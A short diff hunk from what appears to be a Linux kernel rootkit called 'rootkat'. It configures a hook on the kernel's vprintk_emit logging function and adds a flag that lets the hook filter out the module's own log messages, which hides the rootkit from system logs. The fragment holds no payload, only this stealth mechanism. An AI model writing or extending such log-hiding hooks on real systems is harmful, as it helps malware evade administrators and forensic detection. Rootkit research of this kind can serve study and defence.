@@ -25,8 +25,13 @@ static int rootkat_vprintk_emit(int facility, int level,
                                 const char *fmt, va_list args);
 
 static struct rootkat_hook hook_vprintk_emit = {
-	.candidates  = vprintk_emit_candidates,
-	.replacement = rootkat_vprintk_emit,
+	.candidates          = vprintk_emit_candidates,
+	.replacement         = rootkat_vprintk_emit,
+	/* Filter rootkat.ko's own pr_info calls — that's the whole point
+	 * here, so we explicitly opt out of the within_module recursion
+	 * guard. vsnprintf + strnstr in our replacement don't recurse into
+	 * vprintk_emit, so there's no actual loop hazard. */
+	.intercept_own_calls = true,
 };
 
 /*
